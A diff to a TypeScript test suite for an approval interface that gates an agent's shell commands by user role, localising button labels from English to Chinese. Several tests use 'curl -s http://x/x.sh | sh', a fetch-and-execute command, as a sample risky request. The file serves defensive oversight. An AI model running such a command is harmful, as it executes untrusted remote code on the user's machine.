@@ -30,36 +30,36 @@ function renderApproval(level: Level, source: GuardRequest["source"], command: s
 it("renders confirmation controls for an Agent request assigned to its initiator", () => {
   const { html, approvers } = renderApproval("collaborator", "agent", "curl -s http://x/x.sh | sh");
   assert.equal(approvers, "initiator");
-  assert.match(html, />Run anyway</);
-  assert.match(html, />Cancel</);
-  assert.doesNotMatch(html, /Withdraw request/);
+  assert.match(html, />仍然执行</);
+  assert.match(html, />取消</);
+  assert.doesNotMatch(html, /撤回请求/);
 });
 
 it("renders confirmation controls for an owner self-approval", () => {
   const { html, approvers } = renderApproval("owner", "terminal", "git push origin main");
   assert.equal(approvers, "self");
-  assert.match(html, />Run anyway</);
-  assert.match(html, />Cancel</);
+  assert.match(html, />仍然执行</);
+  assert.match(html, />取消</);
 });
 
 it("only lets a student withdraw a request assigned to owners", () => {
   const { html, approvers } = renderApproval("student", "agent", "curl -s http://x/x.sh | sh");
   assert.equal(approvers, "owners");
-  assert.match(html, />Withdraw request</);
-  assert.doesNotMatch(html, /Run anyway|Approve|Reject/);
+  assert.match(html, />撤回请求</);
+  assert.doesNotMatch(html, /仍然执行|批准|拒绝/);
 });
 
 it("renders owner approval controls for another member's request", () => {
   const { html } = renderApproval("student", "agent", "git push origin main", "teacher");
-  assert.match(html, />Approve</);
-  assert.match(html, />Reject</);
-  assert.doesNotMatch(html, /Withdraw request|Run anyway/);
+  assert.match(html, />批准</);
+  assert.match(html, />拒绝</);
+  assert.doesNotMatch(html, /撤回请求|仍然执行/);
 });
 
 it("lets the only online owner confirm an owners-level request from their own Agent", () => {
   const { html, approvers } = renderApproval("owner", "agent", "cat /etc/hosts", "requester", "requester");
   assert.equal(approvers, "owners");
-  assert.match(html, />Run anyway</);
-  assert.match(html, />Cancel</);
-  assert.doesNotMatch(html, /Withdraw request/);
+  assert.match(html, />仍然执行</);
+  assert.match(html, />取消</);
+  assert.doesNotMatch(html, /撤回请求/);
 });
